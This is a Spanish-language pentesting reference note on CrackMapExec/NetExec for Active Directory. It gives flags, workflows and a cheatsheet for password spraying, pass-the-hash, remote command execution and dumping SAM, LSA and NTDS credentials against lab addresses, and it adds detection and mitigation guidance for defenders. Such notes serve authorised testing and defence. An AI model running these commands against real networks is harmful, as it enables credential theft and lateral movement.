---
aliases: ["CrackMapExec", "CME", "NetExec", "nxc", "cme"]
tags: [tool/crackmapexec]
tipo: herramienta
estado: terminado
creado: 2026-10-11
actualizado: 2026-10-11
relacionado:
  - "[[SMBMap]]"
  - "[[smbclient Cliente de Línea de Comandos para SMBCIFS]]"
  - "[[THC Hydra]]"
  - "[[Nmap Guía Completa]]"
  - "[[Enumeración de Servicios y CMS]]"
  - "[[Reconocimiento y Escaneo de Redes y Web]]"
fuente: "https://github.com/Pennyw0rth/NetExec"
---

# CrackMapExec: La Navaja Suiza para Pentesting de Active Directory

**CrackMapExec** (CME) automatiza la evaluación de Active Directory a gran escala: valida credenciales, enumera SMB/LDAP/WinRM, ejecuta comandos y vuelca credenciales en **un solo proceso asíncrono** sobre decenas o cientos de hosts. Es la herramienta de "movimiento lateral y enumeración masiva" por defecto en cualquier laboratorio AD.

> [!info] Linaje: CME → NetExec
> El proyecto original (`byt3bl33d3r/CrackMapExec`) dejó de mantenerse a finales de 2023 y la comunidad lo continuó como **[NetExec](https://github.com/Pennyw0rth/NetExec)** (`nxc`). En Kali conviven el binario `crackmapexec` (envoltorio/enlace de compatibilidad) y `nxc`: **la sintaxis es prácticamente idéntica** (`<tool> <protocolo> <objetivo> ...`), pero los flags evolucionan por separado. Esta nota documenta el flujo CME clásico y señala las diferencias relevantes de NetExec. Fuente de verdad de flags: `crackmapexec <proto> -h` o `nxc <proto> -h`.

## Instalación

```bash
# Kali (incluye NetExec; crackmapexec sigue disponible como alias)
sudo apt update && sudo apt install netexec

# Comprobar ambos nombres
crackmapexec --version
nxc --version

# Desde fuente (equipo de desarrollo / laboratorio)
git clone https://github.com/Pennyw0rth/NetExec.git
cd NetExec && python3 -m pip install .
```

## Modelo mental: protocolo + objetivo + credencial + acción

```text
crackmapexec  <protocolo>  <objetivo(s)>  -u <user> -p <pass>  <acción>
     ▲             ▲            ▲               ▲                ▲
   binario    smb/ldap/    IP, CIDR o rango   autenticación   --shares, -x,
              winrm/ssh/   10.10.10.0/24      (o PTH/Kerb)    --sam, -M ...
              rdp/mssql/
              ftp/http/nfs
```

Sin acción, CME solo **valida credenciales** (spraying). Con acción, usa la sesión autenticada para enumerar o ejecutar.

### Protocolos

| Protocolo | Qué obtienes con una credencial válida | Uso típico |
|---|---|---|
| `smb` | Shares, sesiones, usuarios locales, SAM/LSA/NTDS, ejecución remota | El caballo de batalla (445) |
| `ldap` | Users, groups, computers, política de contraseñas, ACL | Enumeración AD sin ruido SMB |
| `mssql` | Query, `xp_cmdshell` | SQL Server (1433) |
| `winrm` | Shell/comandos (5985/5986) | Ejecución en hosts modernos |
| `ssh` | Comando o shell; `--key-file` | Linux/AD híbrido |
| `rdp` | Validación de credencial, sesiones | Comprobar alcance de la cuenta |
| `ftp`, `http`, `nfs`, `wmi` | Enumeración específica | Servicios auxiliares |

## Referencia de flags por escenario

### Autenticación

| Flag | Significado | Ejemplo |
|---|---|---|
| `-u`, `--username` | Usuario (admite lista separada por comas) | `-u admin,juan,sofia` |
| `-p`, `--password` | Contraseña (admite lista separada por comas) | `-p 'Password123,P@ssw0rd'` |
| `-H`, `--hashes` | Pass-the-Hash con NT:LM (`:NT` basta) | `-H ':aad3b435...:nt_hash'` |
| `-d`, `--domain` | Dominio / workgroup | `-d LAB` |
| `--dc-ip` | IP del controlador de dominio (obligatorio si DNS falla) | `--dc-ip 10.10.10.10` |
| `--aesKey` | Pass-the-Key: clave AES de Kerberos (`--aesKey <hex>`) | `--aesKey 4a1f...` |
| `-k` | Autenticación Kerberos con tickets del caché (`KRB5CCNAME`) | `-k` |
| (sin `-d`) | Autenticación **local** al host objetivo | `crackmapexec ssh 10.10.10.50 -u root -p toor` |
| `-u '' -p ''` | **Null session** / anónimo (SMB, LDAP) | `-u '' -p ''` |

> [!tip] Jerarquía de credenciales en AD
> 1. **Clave en claro** → 2. **NTLM hash** (`-H`, Pass-the-Hash) → 3. **Ticket Kerberos** (`-k`/`--aesKey`). Si tienes el hash, no necesitas la clave: los hashes NTLM son el *hash de almacenamiento* y se reutilizan tal cual (ver [[THC Hydra]] para obtener claves, y los dumps tipo mimikatz/`--sam` para obtener hashes).

> [!warning] Corrección respecto a notas previas
> - **`-id` no es una opción de CME/NetExec**: el formato `[dominio/]usuario:contraseña` no se pasa como flag; usuario y contraseña van por separado (`-u`/`-p`) o en listas con coma. Ese formato sí lo usan las herramientas hermanas (p. ej. ficheros combo de fuerza bruta).
> - **`-t` / `--threads` con defecto 100 no existe en CME**: es asíncrono por defecto y no expone hilos; el control de carga se hace con timeout/retraso y con el tamaño del rango. Verificar siempre con `<tool> <proto> -h`.

### Objetivos y carga

| Flag | Significado | Ejemplo |
|---|---|---|
| (posicional 1) | Protocolo | `smb` |
| (posicional 2) | Objetivo(s): IP, CIDR, rango | `10.10.10.0/24`, `10.10.10.1-10.10.10.50` |
| `--port` | Puerto alternativo (445→1445, ssh→2222…) | `--port 1445` |
| `--timeout` | Timeout de conexión (segundos, según versión) | `--timeout 30` |
| `--delay` / `--jitter` | Retraso fijo/aleatorio entre conexiones (menos ruido) | `--delay 1 --jitter 2` |
| `--source-ip` | IP de origen (cuando hay rutas múltiples) | `--source-ip 10.10.10.99` |

### Resultado de una operación

| Flag | Significado |
|---|---|
| `--continue-on-success` | **Sigue probando tras un acierto** (clave para spraying con varias contraseñas) |
| `--stop-on-success` | Detiene el host al primer acierto (evita bloqueos) |
| `--no-bruteforce` | Un solo intento por usuario (solo primera contraseña de la lista) |
| `-v` / `--verbose` | Salida detallada (nombres exactos según versión) |
| (log/DB) | Todo queda en el almacén de CME bajo `~/.cme/` (o `~/.nxc/` en NetExec) — ver "Salida y post-proceso" |

### Acciones sobre SMB (las que se usan cada día)

| Flag | Qué hace | Ejemplo |
|---|---|---|
| `--shares` | Lista shares + permisos de acceso (READ/WRITE) | `... --shares` |
| `--sessions` | Sesiones SMB abiertas (quién está conectado a qué) | `... --sessions` |
| `--loggedon-users` | Usuarios con sesión interactiva | `... --loggedon-users` |
| `--users` / `--groups` | Usuarios/grupos (local o de dominio según contexto) | `... --users` |
| `--computers` | Máquinas del dominio | `... --computers` |
| `--pass-pol` | Política de contraseñas ( longitud, lockout, duración ) | `... --pass-pol` |
| `--sam` | Vuelca SAM local (hashes NTLM de cuentas locales) | `... --sam` |
| `--lsa` | Credenciales en LSA (servicios, tareas, credenciales guardadas) | `... --lsa` |
| `--ntds` | Cuenta de dominio vía NTDS.dit (requiere admin en el DC) | `... --ntds` |
| `-x`, `--command` | Ejecuta comando con el método elegido | `-x "whoami"` |
| `--shell` | Shell interactiva (si el método lo permite) | `--shell` |
| `--exec-method` | `smbexec` / `atexec` / `wmiexec` / `mmcexec` | `--exec-method atexec` |
| `-M`, `--module` | Ejecuta un módulo de la comunidad | `-M <modulo>` |
| `-o`, `--options` | Parámetros del módulo | `-o opcion=valor` |

> [!warning] `--ntds` es ruidoso
> Copiar NTDS.dit o lanzar DCSync dispara alertas de seguridad de AD de inmediato (replicación de directorio desde un host que no es un DC). Reservarlo para la fase de explotación, nunca para enumeración.

### Acciones en otros protocolos

| Protocolo | Acciones típicas |
|---|---|
| `ldap` | `--users --groups --computers` (enum AD limpia, tráfico 389/636) |
| `winrm` / `ssh` | `-x "whoami"` o `--shell` |
| `mssql` | `-x "exec xp_cmdshell 'whoami'"` (si está habilitado) |
| `http` | Enumeración de directorios/paneles con credenciales básicas |
| `nfs` | Listado de shares exportados sin credenciales |

### Módulos (`-M`)

Los módulos son scripts Python de la comunidad que se coloca en el directorio de módulos (`~/.cme/modules` en CME, `~/.nxc/modules` en NetExec) y se invocan con `-M <nombre> -o clave=valor`:

```bash
# Mecanismo (el módulo concreto depende de tu instalación/versión)
crackmapexec smb 10.10.10.0/24 -u admin -p 'Pass123' -M <modulo> -o opcion=valor
nxc smb 10.10.10.0/24 -u admin -p 'Pass123' -M <modulo>
```

| Qué necesitas | Dónde |
|---|---|
| Listado de módulos disponibles | `<tool> <proto> -h` (sección "module options") + documentación de NetExec |
| Añadir módulo propio | Copiar el `.py` al directorio de módulos y recargar |
| Módulos clásicos del ecosistema | Enumeración AD, BLOODHOUND-friendly dumps, comprobaciones de configuración |

## Workflows reales

### 1. De credenciales sueltas a mapa de acceso (spraying)

```bash
# Paso 0 — comprobar alcance del servicio en el rango (previo, con Nmap)
nmap -p 445,389,5985 --open -iL hosts.txt -oA smb_scope

# Paso 1 — validar una sola credencial contra todo el rango
crackmapexec smb 10.10.10.0/24 -u jdoe -p 'Summer2024!' -d LAB

# Paso 2 — spraying de una password contra varios usuarios (un intento por usuario)
crackmapexec smb 10.10.10.0/24 -u admin,jdoe,backup,svc_sql -p 'Company2024!' -d LAB --no-bruteforce

# Paso 3 — seguir probando contraseñas aunque una acierte (¡vigilar lockout!)
crackmapexec smb 10.10.10.0/24 -u jdoe -p 'Pass1,Pass2,Pass3' -d LAB --continue-on-success

# Paso 4 — con hash (Pass-the-Hash) sobre hosts donde la clave no vale
crackmapexec smb 10.10.10.50 -u administrator -H ':fc525c9683e8fe067095ba2ddc971889' -d LAB
```

### 2. Enumeración post-acceso

```bash
# ¿Qué hay en el host?
crackmapexec smb 10.10.10.50 -u jdoe -p 'Summer2024!' --shares --loggedon-users --pass-pol

# ¿Quién más está logueado en la red?
crackmapexec smb 10.10.10.0/24 -u jdoe -p 'Summer2024!' --sessions

# Enum AD por LDAP (mucho más silencioso que SMB contra 254 hosts)
crackmapexec ldap 10.10.10.10 -u jdoe -p 'Summer2024!' --users --groups
```

### 3. Ejecución remota

```bash
# Comando único (atexec = tarea programada, limpio en logs de 4688 con contexto)
crackmapexec smb 10.10.10.50 -u admin -p 'Pass' --exec-method atexec -x "whoami /all"

# Dónde sigo siendo admin (local admin check masivo)
crackmapexec smb 10.10.10.0/24 -u admin -p 'Pass'
# → los hosts con "(Pwn3d!)" son los que puedes ejecutar
```

## Interpretación de la salida

```text
SMB      10.10.10.20  445  WS01   [*] WINDOWS 10 / Workstation - LAB - WS01
SMB      10.10.10.20  445  WS01   [-] LAB\backup:Summer2020!  STATUS_LOGON_FAILURE
SMB      10.10.10.20  445  WS01   [+] LAB\jdoe:Summer2024!  (Pwn3d!)
SMB      10.10.10.30  445  WS02   [+] LAB\jdoe:Summer2024!
```

| Elemento | Significado |
|---|---|
| `SMB  10.10.10.20  445` | Protocolo, IP, puerto |
| `[*]` | Información (banner/SO/dominio detectados) |
| `[-]` | Credencial **inválida** (`STATUS_LOGON_FAILURE`, `STATUS_ACCOUNT_DISABLED`…) |
| `[+]` | Credencial **válida** (o acción completada) |
| `[!]` | Aviso (cuenta bloqueada, dominio inaccesible…) |
| `(Pwn3d!)` | **Eres admin local**: la cuenta puede ejecutar comandos en ese host |
| `STATUS_PASSWORD_MUST_CHANGE` / `STATUS_PASSWORD_EXPIRED` | Credencial válida pero hay que cambiarla (¡a menudo sigue sirviendo para servicios!) |
| `STATUS_ACCOUNT_LOCKED_OUT` | **Para inmediato** esa cuenta: el lockout policy se activó |
| `STATUS_TRUSTED_RELATIONSHIP_FAILURE` | La relación de confianza máquina↔dominio está rota |

> [!tip] El orden de lectura de una pantalla de spraying
> 1) ¿Aparece `(Pwn3d!)`? → prioridad alta. 2) ¿`[+]` sin `Pwn3d`? → credencial válida, falta privilegio. 3) ¿muchos `[!]` locked? → parar y avisar (en pentest con clientes, esto es parte del alcance firmado).

### Salida y post-proceso

- CME/NetExec mantienen un **almacén local** de hosts/credenciales (`~/.cme/`, respaldos y logs; en NetExec `~/.nxc/`) que se puede listar/limpiar con los subcomandos de base de datos (`cme db`, `cme show`, `cme delete` en CME; `nxc db`/`nxc show` en NetExec — nombres exactos según versión).
- Para informes, encadena la salida por `grep 'Pwn3d\|\[+\]'` o redirige a fichero con `tee`.
- Las opciones de exportación (`-o`, `--json`, `--csv`, `--log`) **varían entre versiones**: confirmar con `<tool> <proto> -h` antes de automatizar un pipeline.

## Detección y contramedidas (defensor)

| Actividad | Señal en el dominio | Mitigación |
|---|---|---|
| Spraying | Cientos de **Event 4625** (logon fallido, type 3) desde un origen hacia muchos destinos | Smart Lockout, Azure AD Protection, alerta "multiple failed logons" |
| Logón válido masivo | **4624 type 3** en cadena desde una IP | Canary/honey accounts: un intento sobre ellas = alerta inmediata |
| Ejecución remota (`atexec`/`wmiexec`) | Task Scheduler 106/140 + 4624 type 3; WMI 5861 | Loguear creación de tareas remotas, restringir `SeRemoteInteractive` |
| Pass-the-Hash | NTLMv1/v2 desde hosts que no deberían usar NTLM; NTLM relay | **SMB signing obligatorio**, LDAP signing, EPA; deshabilitar NTLM donde sea posible |
| Enumeración LDAP masiva | Ráfaga de consultas `(&(objectClass=user))` desde no-DC | LDAP query rate limiting, auditoría 5136 |
| `--ntds` / DCSync | Réplica de directorio desde host no autorizado (4662) | Monitorear replicación; restringir `Replicating Directory Changes` |
| Shares enumerados | `--shares` genera scans de 445 visibles en NetFlow/Zeek | Segmentación, firewall de este a oeste |

> [!warning] El riesgo operativo real
> El error clásico no es técnicamente: es **bloquear 300 cuentas** con un spraying mal calibrado. Antes de correr cualquier `-p` masivo: comprueba la política con `--pass-pol`, respeta `--no-bruteforce` cuando hay varias contraseñas, y ten un plan de "qué hago si veo `STATUS_ACCOUNT_LOCKED_OUT`".

## Errores comunes (mensaje → arreglo)

1. **`crackmapexec: command not found`** — Kali moderna instaló NetExec.
   → Usar `nxc ...`, o instalar `sudo apt install netexec` / el paquete que provee el alias.
2. **`[-] Error connecting to ...: Connection refused/timeout`** — 445/389 filtrado o host caído.
   → Validar alcance antes: `nmap -p 445,389 --open -iL hosts.txt`; probar `--port` alternativo si el servicio está desplazado.
3. **`KDC_ERR_*` / `cannot resolve ...` en Kerberos** — sin `--dc-ip` o DNS interno no resuelve.
   → `--dc-ip 10.10.10.10 -d LAB.local` y, si usas tickets, exportar `KRB5CCNAME=/ruta/ticket.ccache`.
4. **`STATUS_LOGON_FAILURE` masivo** — contraseña o dominio mal (`-d` omitido autentica *local*).
   → Añadir `-d LAB` (o confirmar con `--pass-pol` que existe el usuario).
5. **`STATUS_ACCOUNT_LOCKED_OUT`** — lockout policy.
   → Parar ese usuario; informar; reanudar con otra credencial o tras el desbloqueo.
6. **`STATUS_TRUSTED_RELATIONSHIP_FAILURE`** — relación de confianza rota de esa máquina.
   → Solo reparable desde el dominio (no es tu error: anótalo como hallazgo).
7. **`(Pwn3d!)` pero el comando no hace nada** — ejecución bloqueada por AV/EDR o método equivocado.
   → Cambiar `--exec-method` (`smbexec`→`atexec`→`wmiexec`).
8. **`Unknown protocol` / uso sin protocolo** — el primer argumento posicional es obligatorio.
   → `nxc smb <ip> ...`, no `nxc <ip> ...`.
9. **Resultado perdido tras reiniciar** — el almacén vive en `~/.cme`/`~/.nxc`.
   → No borrar esa carpeta entre fases; exportar informes con `tee`/`grep`.

## Cheatsheet — los 10 comandos del día a día

```bash
crackmapexec smb 10.10.10.0/24 -u jdoe -p 'Summer2024!' -d LAB
crackmapexec smb 10.10.10.0/24 -u admin,backup,svc_sql -p 'Company2024!' --no-bruteforce
crackmapexec smb 10.10.10.20 -u administrator -H ':fc525c96...' -d LAB
crackmapexec smb 10.10.10.20 -u jdoe -p 'Pass' --shares --pass-pol
crackmapexec smb 10.10.10.0/24 -u jdoe -p 'Pass'        # mapa de (Pwn3d!) hosts
crackmapexec smb 10.10.10.50 -u admin -p 'Pass' --exec-method atexec -x "whoami /all"
crackmapexec ldap 10.10.10.10 -u jdoe -p 'Pass' --users --groups
crackmapexec smb 10.10.10.50 -u admin -p 'Pass' --sam --lsa
crackmapexec smb 10.10.10.0/24 -u jdoe -p 'Pass1,Pass2' --continue-on-success
nxc smb 10.10.10.0/24 -u '' -p ''                       # null session
```

| Tarea | Comando |
|---|---|
| Validar credencial en rango | `<tool> smb <cidr> -u U -p P -d DOM` |
| Spraying 1 pass × N users | `... -u a,b,c -p 'Pass' --no-bruteforce` |
| Pass-the-Hash | `... -u admin -H ':NT'` |
| Shares + política | `... --shares --pass-pol` |
| ¿Dónde soy admin? | `<tool> smb <cidr> -u U -p P` → grep `Pwn3d` |
| Ejecutar comando | `... --exec-method atexec -x "cmd"` |
| Enum AD silencioso | `<tool> ldap <dc> -u U -p P --users` |
| Dump de hashes | `... --sam` / `... --lsa` / `... --ntds` |
| Null session | `... -u '' -p ''` |
| Ayuda real de tu versión | `nxc smb -h` |

## Referencias

- [NetExec (continuación de CME)](https://github.com/Pennyw0rth/NetExec) — wiki, módulos y changelog
- [Archivo histórico CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) — contexto original (sin mantenimiento)
- HackTricks — *Active Directory / CrackMapExec* para el flujo completo y módulos
- GTFOBins — abuso de binarios tras obtener ejecución (`-x`)

## Relacionadas

- [[SMBMap]] — enumeración de shares SMB con foco en lectura/escritura
- [[smbclient Cliente de Línea de Comandos para SMBCIFS]] — acceso interactivo a un share concreto
- [[THC Hydra]] — obtención de credenciales por fuerza bruta (entrada del flujo)
- [[Nmap Guía Completa]] — descubrimiento de 445/389/5985 antes de correr CME
- [[Enumeración de Servicios y CMS]] — metodología de enumeración en general
- [[Reconocimiento y Escaneo de Redes y Web]] — dónde encaja la fase AD
